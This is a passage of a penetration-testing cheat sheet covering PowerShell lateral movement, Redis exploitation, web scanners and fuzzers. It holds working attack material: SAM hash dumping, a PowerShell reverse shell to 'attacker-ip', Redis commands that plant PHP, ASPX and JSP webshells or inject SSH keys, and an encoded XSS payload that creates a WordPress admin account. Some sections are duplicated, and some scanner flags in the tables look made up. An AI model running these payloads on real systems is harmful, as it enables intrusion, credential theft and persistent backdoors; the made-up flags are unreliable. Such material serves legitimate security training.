> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```
### Pass credentials to other systems
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>  # Commands here
>}
> ```
### Copy files and execute
> ```powershell
> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
> Invoke-Command -ComputerName target -ScriptBlock {
>  C:\Windows\Temp\payload.exe
>}
> ```
### PSRemoting through multiple hops
### Enable CredSSP on source
> ```powershell
> Enable-WSManCredSSP -Role Client -DelegateComputer target.com
> ```
### Execute with CredSSP
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName target.com -Credential $cred -Authentication CredSSP -ScriptBlock {
>  Invoke-Command -ComputerName target2.com -ScriptBlock { hostname }
>}
> ```

### Dump SAM hashes
> ```cmd
> reg save HKLM\SAM C:\Windows\Temp\sam
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```

**Reverse Shell**

### PowerShell reverse shell
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
> $stream = $client.GetStream()
> [byte[]]$bytes = 0..65535|%{0}
> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
>   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
>   $sendback = (iex $data 2>&1 | Out-String )
>   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
>   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
>   $stream.Write($sendbyte,0,$sendbyte.Length)
>   $stream.Flush()
> }
> ```
### One-liner reverse shell
> ```powershell
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```

**Domain Reconnaissance**

### Domain information
> ```powershell
> Get-ADDomain
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
>```
### Domain controllers
> ```powershell
> Get-ADDomainController -Filter *
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
> ```
### Domain users
> ```powershell
> Get-ADUser -Filter * -Properties *
> net user /domain
> ```
### Domain computers
> ```powershell
> Get-ADComputer -Filter *
> net view /domain
> ```
### Domain groups
> ```powershell
> Get-ADGroup -Filter *
> net group /domain
> ```
### Group members
> ```powershell
> Get-ADGroupMember "Domain Admins"
> net group "Domain Admins" /domain
> ```
> #### GPOs
> ```powershell
> Get-GPO -All

**Lateral Movement**

### Execute on multiple machines
> ```powershell
> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```
### Pass credentials to other systems
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>  # Commands here
> }
> ```
### Copy files and execute
> ```powershell
> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
> Invoke-Command -ComputerName target -ScriptBlock {
>  C:\Windows\Temp\payload.exe
> }
> ```

---

## Redis

**Common Commands**

| Command      | Description        | Usage                        |
|--------------|--------------------|------------------------------|
| SET          | Set key value      | SET key value                |
| GET          | Get key value      | GET key                      |
| KEYS         | List keys          | KEYS *                       |
| DEL          | Delete key         | DEL key                      |
| FLUSHALL     | Delete all keys    | FLUSHALL                     |
| CONFIG GET   | Get config         | CONFIG GET *                 |
| CONFIG SET   | Set config         | CONFIG SET dir /tmp          |
| SAVE         | Save to disk       | SAVE                         |
| INFO         | Server info        | INFO                         |
| CLIENT LIST  | List clients       | CLIENT LIST                  |
| SLAVEOF      | Set replication    | SLAVEOF host port            |
| MODULE LOAD  | Load module        | MODULE LOAD /path/to/module.so|

**Common Credentials**

| Username       | Password        |
|----------------|-----------------|
| admin          | admin           |
| administrator  | administrator   |
| root           | root            |
| user           | user            |
| test           | test            |
| redis          | redis           |

### Basic log in
> ```bash
> redis-cli -h <hostname> -p <port-number> --user <username> -a <password>
> ```

### Uploading a webshell through redis

- ### Method 1: PHP webshell
> ```bash
> redis-cli -h target.com
>> flushall
>> set shell '<?php system($_REQUEST["cmd"]); ?>'
>> config set dbfilename shell.php
>> config set dir /var/www/html
>> save
> ```
> # Access: http://target.com/shell.php?cmd=whoami

- ### Method 2: ASP.NET webshell
> ```bash
>> set shell '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
>> config set dbfilename shell.aspx
>> config set dir C:\\inetpub\\wwwroot
>> save
> ```
- ### Method 3: JSP webshell
> ```bash
>> set shell '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
>> config set dbfilename shell.jsp
>> config set dir /var/www/html
>> save
> ```

### Injecting SSH

- ### Generate SSH key
> ```bash
> ssh-keygen -t rsa -f redis_key
> ```
- ### Prepare key with newlines
> ```bash
> (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
> ```
- ### Inject into authorized_keys
> ```bash
> redis-cli -h target.com flushall
> cat key.txt | redis-cli -h target.com -x set ssh_key
> redis-cli -h target.com config set dbfilename authorized_keys
> redis-cli -h target.com config set dir /root/.ssh
> redis-cli -h target.com save
> ```
# Alternative paths
1. /home/redis/.ssh/authorized_keys
2. /home/ubuntu/.ssh/authorized_keys
3. /var/lib/redis/.ssh/authorized_keys

- ### Connect via SSH
> ```bash
> ssh -i redis_key root@target.com
> ```

### Using [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)

> ```bash
> # 1. Clone the rpository
> git clone https://github.com/n0b0dyCN/redis-rogue-server
> # 2. Build the code
> cd RedisModulesSDK/exp/
> make
> # 3. Copy the .so file to same folder with redis-rogue-server.py
> # 4. For an interactive shell
> ./redis-rogue-server.py --rhost <target> --lhost <attacker>
> # 5. For reverse shell, set up a nc listener
> ```

---

## Web Testing

**Fingerprinting**

### Web Technology Detection
- ### Detect technologies used by the target website
> ```bash
> whatweb -a 3 [TARGET_IP]
> ```
- ### Obtain SSL certificate information
> ```bash
> openssl s_client -connect <target_domain>:443
> ```
- ### Use BuiltWith to gather detailed technology profile
> ```bash
> builtwith [TARGET_IP]
> ```

**Scanners**
## Nikto
- ### Installation
> ```bash
> sudo apt-get install nikto
> ```
- ### Standard Command to Scan Websites
> ```bash
> nikto –host (web url host name) –(http port number)
> ```
- ### Scan Options
> ```bash
> nikto –h (Hostname/IP address)            # Scan a host
> nikto -h -port (Port Number1),(Port Number2)  # Scan host targeting specific ports
> nikto -h (Hostname) -maxtime (seconds)    # Define maximum scan time
> nikto -h-until                           # Scan duration
> nikto -h-vhost                           # Define host header
> nikto -h-no404                           # Skip http 404 guessing
> nikto -h-nossl                           # Stop using SSL during scan
> nikto -h-ssl                             # Force to use SSL
> nikto -update                            # Update scan engine plugins
> nikto -h-dbcheck                         # Check database
> nikto -h (Hostname/IP address) -output (filename)  # Input output to a file
> nikto -h-useproxy (Proxy IP address)     # Web host scan via a proxy
> nikto -h-config (filename.conf)          # Use a specified file as a database
> nikto -h-nolookup                        # Stop DNS lookup for hosts
> nikto -h-nocache                         # Stop caching responses for scans
> ```
- ### Display Options
> ```bash
> nikto -h -Display (option)
> 1    # Display redirects
> 2    # Display cookies
> 3    # Display 200 OK response
> 4    # Display Web URLs requiring authentication
> D    # Display debug output
> E    # Show HTTP errors
> P    # Print to STDOUT
> V    # Verbose output display
> ```
- ### Output Options
> ```bash
> nikto -h -Format
> csv  # Comma Separated Value
> htm  # HTML Format
> txt  # Plain text
> xml  # XML Format
> ```
- ### Tuning Options
> ```bash
> nikto -h (Hostname) -tuning (Option)
> 0    # Upload files
> 7    # Remote File Retrieval - Server Wide
> 1    # View specific file in log
> 8    # Command Execution / Remote Shell
> 2    # Default file misconfiguration
> 9    # SQL Injection
> 3    # Display information disclosure
> a    # Authentication Bypass
> 4    # Injection (XSS/Script/HTML)
> b    # Software Identification
> 5    # Remote File Retrieval - Inside Web Root
> c    # Remote Source Inclusion
> 6    # Denial of Service
> x    # Reverse Tuning Options
> ```

## Nuclei

### Common Nuclei Commands

- ### Basic Usage
> ```bash
> nuclei -u https://example.com
> ```
- ### Scanning from a File
> ```bash
> nuclei -l targets.txt
> ```
- ### Using Custom Templates
> ```bash
> nuclei -t /path/to/templates/
> ```
- ### Scanning for CVEs
> ```bash
> nuclei -t cves/ -l targets.txt
> ```

| Command                           | Example Usage                                          | Function                                                   | Output Example                             |
|-----------------------------------|--------------------------------------------------------|-----------------------------------------------------------|--------------------------------------------|
| **Basic Scan**                    | ```nuclei -u https://example.com```                     | Initiates a basic scan on the specified target URL.        | Scanning https://example.com...             |
| **Scanning from a File**          | ```nuclei -l targets.txt```                            | Scans multiple targets listed in a file.                   | Scanning targets from targets.txt...       |
| **Using Custom Templates**        | ```nuclei -t /path/to/templates/```                    | Uses custom or additional templates from a specified directory. | Using templates from /path/to/templates/    |
| **Scanning for CVEs**             | ```nuclei -t cves/ -l targets.txt```                   | Scans for vulnerabilities related to CVEs using CVE-specific templates. | Scanning for CVEs...                        |
| **Outputting Results to a File**  | ```nuclei -u https://example.com -o output.txt```      | Saves scan results to a specified file for later analysis.  | Results saved to output.txt                |
| **Verbose Output**                | ```nuclei -u https://example.com -v```                 | Provides detailed information about the scanning process.  | Verbose mode enabled.                     |
| **Silent Mode**                   | ```nuclei -u https://example.com -silent```            | Runs the scan without displaying output on the console.    | Running scan in silent mode.              |
| **Displaying Version**            | ```nuclei -version```                                  | Displays the current version of Nuclei installed.          | Nuclei version 2.0.0                       |
| **Updating Nuclei**               | ```nuclei -update```                                   | Updates the Nuclei tool to the latest version available.   | Nuclei updated to the latest version.     |
| **Help and Usage Information**    | ```nuclei -h```                                        | Displays help information and a list of available commands. | Usage: nuclei [options]                   |
| **Specify Multiple Targets**     | ```nuclei -l targets.txt -t /path/to/templates/```     | Scans multiple targets with specified templates.           | Scanning targets from targets.txt...       |
| **Timeout for Requests**          | ```nuclei -u https://example.com -timeout 5```         | Sets a timeout duration for requests during the scan.      | Timeout set to 5 seconds.                  |
| **Custom User-Agent**             | ```nuclei -u https://example.com -ua "CustomUserAgent"``` | Sets a custom User-Agent string for requests.              | Using custom User-Agent: CustomUserAgent  |
| **Output JSON Format**            | ```nuclei -u https://example.com -json```              | Outputs scan results in JSON format.                       | Results saved in JSON format.             |
| **Resume Previous Scan**         | ```nuclei -resume session.json```                      | Resumes a previously interrupted scan using a session file. | Resuming scan from session.json...         |
| **Health Check**                  | ```nuclei -health```                                   | Performs a diagnostic check on the Nuclei tool.            | Nuclei is functioning correctly.           |
| **Include/Exclude Templates**     | ```nuclei -t /path/to/templates/ -exclude exclude.yaml``` | Includes or excludes specific templates during the scan.   | Excluding templates in exclude.yaml       |
| **Use Custom DNS Resolvers**      | ```nuclei -u https://example.com -r resolvers.txt```   | Specifies custom DNS resolvers for the scan.              | Using DNS resolvers from resolvers.txt    |
| **Rate Limiting**                 | ```nuclei -u https://example.com -rl 10```             | Limits requests sent per second during the scan.           | Rate limit set to 10 requests per second.  |
| **Store HTTP Responses**          | ```nuclei -u https://example.com --store-requests```   | Stores HTTP requests and responses during the scan.       | HTTP requests and responses stored.       |
| **Firewall Detection**            | ```nuclei -u https://example.com --detect-firewall```  | Detects the presence of a firewall and assesses its impact on scanning. | Detecting firewall presence...            |
| **Finding Common Log Files**      | ```nuclei -u https://example.com --find-logs```        | Searches for common log files on the target site.          | Searching for log files...                |
| **Finding Common Backup Files**   | ```nuclei -u https://example.com --find-backups```     | Searches for common backup files on the target site.       | Searching for backup files...             |
| **Enumerate Users**               | ```nuclei -u https://example.com --enum-users```       | Lists registered users on the target site.                | Enumerating users...                      |
| **Check for Vulnerabilities**     | ```nuclei -u https://example.com --check-vulns```      | Scans for known vulnerabilities in web components.         | Scanning for vulnerabilities...           |
| **Enumerate Plugins and Extensions** | ```nuclei -u https://example.com --enum-plugins```    | Enumerates installed plugins and extensions.               | Enumerating plugins and extensions...     |
| **Brute Force Testing**           | ```nuclei -u https://example.com --brute --wordlist wordlist.txt``` | Performs brute force attacks to test password strength.     | Brute forcing with wordlist.txt...         |
| **Check Configuration**           | ```nuclei -u https://example.com --check-config```     | Checks for insecure configurations and misconfigurations.  | Checking configuration...                |

## WPScan

### Common Commands
- ### Basic Scan
> ```bash
> wpscan --url http://example.com
> ```
- ### Enumerating Plugins
> ```bash
> wpscan --url http://example.com --enumerate p
> ```
- ### Enumerating Themes
> ```bash
> wpscan --url http://example.com --enumerate t
> ```
- ### Enumerating Users
> ```bash
> wpscan --url http://example.com --enumerate u
> wpscan -u “http://<IP-ADDRESS>/” --username <username> -w /usr/share/seclist/Usernames/xato-usernames-top-1millions-20000.txt
> ```
- ### Brute Forcing
> ```bash
> wpscan --url http://<IP-ADDRESS>/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
> ```

| Command                         | Example Usage                                              | Function                                                       | Output Example                            |
|---------------------------------|------------------------------------------------------------|---------------------------------------------------------------|-------------------------------------------|
| **Basic Usage**                 | ```wpscan --url https://example.com```                      | Initiates a basic scan of the specified WordPress site.        | Crawling https://example.com...            |
| **Display Help**                | ```wpscan --help```                                         | Displays help information and available commands.              | Usage: wpscan [options]                   |
| **Display Version**             | ```wpscan --version```                                      | Displays the current version of WPScan installed.              | WPScan version 3.8.0                      |
| **Update WPScan**               | ```wpscan --update```                                       | Updates the WPScan tool to the latest version.                 | WPScan updated to the latest version.    |
| **Using an API Token**          | ```wpscan --url https://example.com --api-token YOUR_API_TOKEN``` | Allows enhanced features with an API token.                    | Using API token for enhanced data...     |
| **Enumerate All Available Options** | ```wpscan --url https://example.com --enumerate ap,at,au``` | Enumerates all available options, including plugins, themes, and users. | Enumerating all available options...      |
| **Enumerate Plugins**           | ```wpscan --url https://example.com --enumerate p```        | Enumerates installed plugins on the target site.               | Enumerating plugins...                   |
| **Enumerate Themes**            | ```wpscan --url https://example.com --enumerate t```        | Enumerates installed themes on the target site.                | Enumerating themes...                    |
| **Enumerate Users**             | ```wpscan --url https://example.com --enumerate u```        | Enumerates users registered on the target WordPress site.      | Enumerating users...                     |
| **Check for Vulnerabilities**   | ```wpscan --url https://example.com --plugins-detection mixed``` | Checks for known vulnerabilities in detected plugins.           | Scanning for vulnerabilities...          |
| **Check for Specific Vulnerabilities** | ```wpscan --url https://example.com --vulnerable``` | Checks for specific vulnerabilities listed in the database.    | Checking for known vulnerabilities...     |
| **Brute Force Enumeration**     | ```wpscan --url https://example.com --brute --wordlist wordlist.txt``` | Uses brute force to discover usernames or passwords.           | Brute forcing usernames...               |
| **Use Proxy**                   | ```wpscan --url https://example.com --proxy http://proxy.example.com``` | Uses a specified proxy for requests.                          | Using proxy: http://proxy.example.com     |
| **Custom User-Agent**           | ```wpscan --url https://example.com --user-agent "CustomUserAgent"``` | Sets a custom User-Agent string for requests.                  | Using custom User-Agent: CustomUserAgent |
| **Rate Limiting**               | ```wpscan --url https://example.com --rate-limit 5```       | Limits the number of requests sent per second.                 | Rate limit set to 5 requests per second. |
| **Output Results to a File**    | ```wpscan --url https://example.com -o output.txt```        | Outputs the scan results to a specified file.                  | Results saved to output.txt              |
| **Output JSON**                 | ```wpscan --url https://example.com --output-json```        | Outputs results in JSON format.                                | Results saved in JSON format.            |
| **Store HTTP Responses**        | ```wpscan --url https://example.com --store-requests```     | Stores HTTP requests and responses during the scan.            | HTTP requests and responses stored.      |
| **Verbose Mode**                | ```wpscan --url https://example.com --verbose```            | Enables verbose output for detailed information.              | Verbose mode enabled.                    |
| **Resume Scan**                 | ```wpscan --url https://example.com --resume resume.cfg```  | Resumes a scan using a previous session configuration file.    | Resuming scan from resume.cfg...         |
| **Exclude Specific Paths**      | ```wpscan --url https://example.com --exclude-path /wp-admin``` | Excludes specified paths from the scan.                        | Excluding path: /wp-admin                |

- ### Gather WordPress Nonce: to attack with a HttpOnly cookie on WordPress: We need to create a Js function that fetches the nonce which is a server generated token to prevent CSRF attacks
> ```javascript
> var request = new XMLHttpRequest();
> var targetURL = "/wp-admin/user-new.php";
> var regex = /name="([^"]*?)"/g;
> request.open("GET", targetURL, false);
> request.send();
> var match = regex.exec(request.responseText);
> var nonce = match[1];
> ```
- ### Create New WordPress Admin Account
> ```javascript
> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
> var request = new XMLHttpRequest();
> request.open("POST", targetURL, true);
> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
> request.send(params);
> ```
- ### Compress the JavaScript Code: use the tool JSCompress  -  https://jscompress.com/
> ```javascript
> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
> var request = new XMLHttpRequest();
> request.open("POST", targetURL, true);
> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
> request.send(params);
> ```
- ### Encode the JavaScript Payload: use the following JS function.
> ```javascript
> function toJavaScriptEncoding(str) {
>     var result = '';
>     for (var i = 0; i < str.length; i++) {
>         result += str.charCodeAt(i);
>         if (i !== str.length - 1) {
>             result += ",";
>         }
>     }
>     return result;
> }
> 
> let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
> console.log(encodedPayload);
> ```
- ### Request and Execute the Payload: the function eval is responsible for interpreting the string as code and execute it.
> ```bash
> curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
> ```

## Curl

### Basic Requests
> - GET Request
> ```bash
> curl http://example.com
> ```

> - GET Request with Custom Headers
> ```bash 
> curl -H "Accept: application/json" http://example.com
> ```

### Data Submission
> - POST Request with Form Data
> ```bash
> curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
> ```

> - POST Request with JSON Data
> ```bash
> curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
> ```

> - Automatically Perform URL Encoding
> ```bash
> curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit
> ```
> - PUT Request with Form Data
> ```bash
> curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
> ```
> - DELETE Request
> ```bash
> curl -X DELETE http://example.com/delete
> ```

### Authentication and Headers
> - Basic Authentication
> ```bash
> curl -u username:password http://example.com
> ```
> - Custom User-Agent
> ```bash
> curl -A "CustomUserAgent/1.0" http://example.com
> ```

### Response Handling
> - Include Response Headers
> ```bash
> curl -i http://example.com
> ```

> - Save Response to File
> ```bash
> curl -o filename.html http://example.com
> ```
    
> - Show Response Headers Only
> ```bash
> curl -I http://example.com
> ```
    
> - Print Response Body Only
> ```bash
> curl -s http://example.com
> ```

> - Show Detailed Request and Response
> ```
> curl -v http://example.com
> ```

### Cookies and Session Management
> - Send Cookies
> ```bash
> curl -b "cookie1=value1; cookie2=value2" http://example.com
> ```

> - Save Cookies to File
> ```bash
> curl -c cookies.txt http://example.com
> ```

> - Load Cookies from File
> ```bash
> curl -b cookies.txt http://example.com
> ```

### File Operations
> - Upload a File
> ```bash
> curl -F "file=@path/to/file" http://example.com/upload
> ```

> - Download a File with Resume Support
> ```bash
> curl -C - -o filename http://example.com/file
> ```

### Proxy and Security
> - Use a Proxy
> ```bash
> curl -x http://proxyserver:port http://example.com
> ```

> - Use HTTPS and Insecure SSL
> ```bash
> curl -k https://example.com
> ```

### Additional Options
> - Follow Redirects
> ```bash
> curl -L http://example.com
> ```
    
> - Set Timeout
> ```bash
> curl --max-time 30 http://example.com
> ```
    
> - Show Only Response Code
> ```bash
> curl -s -o /dev/null -w "%{http_code}" http://example.com
> ```
    
> - Use HTTP/2
> ``` bash
> curl --http2 http://example.com
> ```

**Directory Discovery**

## FFUF

| Command                            | Example Usage                                                | Function                                                        | Output Example                             |
|------------------------------------|--------------------------------------------------------------|----------------------------------------------------------------|--------------------------------------------|
| **URL to Fuzz**                    | ```ffuf -u http://target.com/FUZZ```                          | Specifies the target URL with FUZZ as a placeholder.           | Target: http://target.com/admin            |
| **Wordlist**                       | ```ffuf -w /path/to/wordlist.txt```                           | Specifies the wordlist to use for fuzzing.                     | Using wordlist: /path/to/wordlist.txt      |
| **Use Multiple Wordlists**         | ```ffuf -w /path/to/wordlist1.txt:/path/to/wordlist2.txt```   | Allows multiple wordlists for fuzzing.                         | Found: /login/                             |
| **HTTP Method**                    | ```ffuf -X POST```                                           | Specifies the HTTP method for fuzzing.                         | POST /api/login                            |
| **Custom HTTP Headers**            | ```ffuf -H "Authorization: Bearer token"```                  | Sets custom HTTP headers for the request.                      | Authorization header sent                 |
| **Custom User-Agent**              | ```ffuf -H "User-Agent: CustomAgent"```                       | Specifies a custom User-Agent header.                          | User-Agent: CustomAgent                    |
| **Use Proxy**                      | ```ffuf -x http://proxy:8080```                              | Sends requests through a specified proxy.                      | Proxy: http://proxy:8080                   |
| **Follow Redirects**               | ```ffuf -r```                                                | Follows HTTP redirects during fuzzing.                         | Following redirects                        |
| **Set Delay Between Requests**     | ```ffuf -d 2```                                              | Sets a delay in seconds between each request.                  | Request delay: 2 seconds                   |
| **Limit Concurrent Requests**      | ```ffuf -p 10```                                             | Limits the number of concurrent requests.                      | 10 concurrent requests in progress        |
| **Timeout**                         | ```ffuf -t 60```                                             | Sets the request timeout in seconds.                           | Timeout set to 60 seconds                  |
| **Match HTTP Status Codes**        | ```ffuf -mc 200```                                           | Filters results to show only specific HTTP status codes.       | 200: /home/                                |
| **Filter HTTP Status Codes**       | ```ffuf -fc 404```                                           | Filters out results with specific HTTP status codes.           | 200: /secret.php                          |
| **Filter by Content Size**         | ```ffuf -fs 4242```                                          | Filters results based on content size.                         | Filtered: 4242 bytes                       |
| **Filter by Line Count**           | ```ffuf -fl 42```                                            | Filters results based on the number of lines.                  | Filtered: 42 lines                         |
| **Filter by Word Count**           | ```ffuf -fw 1337```                                          | Filters results based on the number of words.                  | Filtered: 1337 words                       |
| **Filter by Regex**                | ```ffuf -fr "regex"```                                       | Filters results based on a regex pattern.                      | Filtered: regex match                      |
| **Auto-calibration**               | ```ffuf -ac```                                               | Automatically calibrates filters based on baseline requests.   | Auto-calibration complete                  |
| **Auto-calibration Strategy**      | ```ffuf -acs mode```                                         | Sets the auto-calibration strategy (e.g., basic, advanced).    | Auto-calibration strategy: basic           |
| **Enable Recursive Mode**          | ```ffuf -recursion```                                        | Enables recursive scanning within discovered directories.      | Discovered: /admin/login/                  |
| **Recursion Depth**                | ```ffuf -recursion-depth 2```                                | Sets the maximum recursion depth.                              | Recursion depth set to 2                   |
| **Stop on First Match**            | ```ffuf -sf```                                               | Stops the fuzzing process after the first match is found.      | Stopped after first match: /admin         |
| **Stop on Spelling Error**         | ```ffuf -ss```                                               | Stops fuzzing on spelling errors.                              | Stopped on spelling error                  |
| **Ignore Wordlist Comments**       | ```ffuf -ignore-wordlist-comments```                         | Ignores lines starting with `#` in the wordlist.               | Comments ignored in wordlist               |
| **Verbose Mode**                   | ```ffuf -v```                                                | Enables verbose output during fuzzing.                         | Request: /FUZZ sent, response: 200        |
| **Quiet Mode**                     | ```ffuf -s```                                                | Suppresses the banner and only prints results.                | Quiet mode enabled                        |
| **Color Output**                   | ```ffuf -c```                                                | Enables colorized output in the terminal.                     | Colorized output                          |
| **Show All Status Codes**          | ```ffuf -ac-all```                                           | Displays all HTTP status codes, including non-200 responses.  | Displayed all HTTP status codes           |
| **Output to File**                 | ```ffuf -o output.json```                                    | Outputs results to a specified file.                           | Results saved to output.json              |
| **Output Format**                  | ```ffuf -of json```                                          | Specifies the output format (e.g., json, ejson, html, md, csv). | Output format: json                       |
| **Input from File**                | ```ffuf -input-cmd "cat input.txt"```                        | Reads input from a file instead of standard input.             | Input read from file                       |

### Examples of usage
- ###Basic Subdomain fuzzing
> ```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP-ADDRESS -H "Host: FUZZ.<IP-ADDRESS>" -t 200 -ic -fw 18
>
- ###Filter to show only 200 or 3xx responses
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
> ```
- ### Output results to a file
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
> ```
- ### Recursive directory fuzzing
> ```
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion
> ```
- ### Set number of threads
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
> ```
- ### Use proxy
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
> ```
- ### Use a delay between requests
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5
> ```
- ### Set request timeout
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10
> ```
- ### Match response size
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242
> ```
- ###Basic file fuzzing
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ
> ```
- ### Filter to show only 200 or 3xx responses
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
> ```
- ### Specify extensions
> ```bash
> ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399
> ```
- ### Output results to a file
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
> ```
- ### Set number of threads
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
> ```
- ### Use proxy
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
> ```
- LFI Fuzzing
- ### Normal Fuzzing
> ```bash
> ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
> ```
- ### Fuzz GET parameters
> ```bash
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
> ```
- ### Fuzz PHP files
> ```bash
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
> ```
- ### Fuzz Webroot: to fuzz for index.php use wordlist for Linux or wordlist for windows, or this general wordlist alternative; consider that depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
> ```bash
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
> ```
- ### Fuzz Server Logs and Configs: we can use the same wordlists as before
> ```bash
> ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
> ```
- ### For Subdomain Discovery
> ```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP Address> -H "Host: FUZZ.<IP Address>" -t 200 -ic -fw 18
> ```

## Dirb

- ### Basic directory scanning
> ```bash
> dirb http://target /path/to/wordlist.txt
> ```
- ### Save output to a file
> ```bash
> dirb http://target /path/to/wordlist.txt -o results.txt
> ```
- ### Use custom user-agent
> ```bash
> dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"
> ```
- ### Ignore non-existent pages
> ```bash
> dirb http://target /path/to/wordlist.txt -N
> ```
- ### Scan SSL (HTTPS)
> ```bash
> dirb https://target /path/to/wordlist.txt
> ```
- ### Recursively scan directories
> ```bash
> dirb http://target /path/to/wordlist.txt -r
> ```
- ### Exclude specific status codes
> ```bash
> dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt
> ```
- ### Example usage
> ```bash
> dirb http://target.com
> ```
- ### Basic file scanning with default extensions
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt
> ```
> ### Save output to a file
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt
> ```
- ### Use custom user-agent
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"
> ```
- ### Ignore non-existent pages
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N
> ```
- ### Scan SSL (HTTPS)
> ```bash
> dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
> ```

## Gobuster

| Command                         | Example Usage                                                  | Function                                                     | Output Example                             |
|---------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------|
| **Directory Enumeration**       | ```gobuster dir -u http://example.com -w wordlist.txt```        | Performs basic directory enumeration.                        | http://example.com/admin (Status: 200) [Size: 1234] |
| **Specify File Extensions**     | ```gobuster dir -u http://example.com -w wordlist.txt -x php,html``` | Searches for files with specific extensions.                 | http://example.com/index.php (Status: 200) |
| **Custom Status Codes**         | ```gobuster dir -u http://example.com -w wordlist.txt -s 200,301``` | Filters results by HTTP status codes.                        | http://example.com/backup (Status: 301)   |
